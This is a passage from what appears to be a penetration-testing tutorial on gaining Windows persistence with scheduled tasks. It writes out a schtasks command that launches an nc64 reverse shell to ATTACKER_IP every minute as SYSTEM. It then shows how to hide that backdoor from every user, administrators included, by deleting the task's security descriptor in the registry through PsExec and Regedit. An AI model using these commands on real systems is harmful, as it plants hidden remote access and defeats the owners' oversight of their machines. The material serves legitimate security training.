Task Scheduler:
We can also use scheduled tasks to establish persistence if needed. There are several ways to schedule the execution of a payload in Windows systems. Let's look at some of them:

Task Scheduler

The most common way to schedule tasks is using the built-in Windows task scheduler. 
Let's create a task that runs a reverse shell every single minute. 


Command Prompt
C:\> schtasks /create /sc minute /mo 1 /tn TASKNAME /tr "c:\tools\nc64 -e cmd.exe ATTACKER_IP PORT" /ru SYSTEM


The previous command will create a "TASKNAME" task and execute an nc64 reverse shell back to the attacker. 
The /sc and /mo options indicate that the task should be run every single minute. 
The /ru option indicates that the task will run with SYSTEM privileges.

To check if our task was successfully created, we can use the following command:

Command Prompt
C:\> schtasks /query /tn TASKNAME

Folder: \
TaskName                                 Next Run Time          Status

Making Our Task Invisible

Our task should be up and running by now, but if the compromised user tries to list its scheduled tasks, our backdoor will be noticeable. 

To further hide our scheduled task, we can make it invisible to any user in the system by deleting its Security Descriptor (SD). 

MAKE THE TASK INVISIBLE:
    The security descriptor is simply an ACL that states which users have access to the scheduled task. 
    If your user isn't allowed to query a scheduled task, you won't be able to see it anymore, as Windows only shows you the tasks that you have permission to use. 
    Deleting the SD is equivalent to disallowing all users' access to the scheduled task, including administrators.
    The security descriptors of all scheduled tasks are stored in:

        HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\. 

    You will find a registry key for every task, under which a value named "SD" contains the security descriptor. 
    You can only erase the value if you hold SYSTEM privileges.

    To hide our task, let's delete the SD value for the "TASKNAME" task we created before. 

    To do so, we will use psexec (available in C:\tools) to open Regedit with SYSTEM privileges:

    Command Prompt
    C:\> c:\tools\pstools\PsExec64.exe -s -i regedit
    We will then delete the security descriptor for our task:

Task Scheduler SD

If we try to query our service again, the system will tell us there is no such task:

Command Prompt
C:\> schtasks /query /tn TASKNAME ERROR: The system cannot find the file specified.
If we start an nc listener in our attacker's machine, we should get a shell back after a minute:
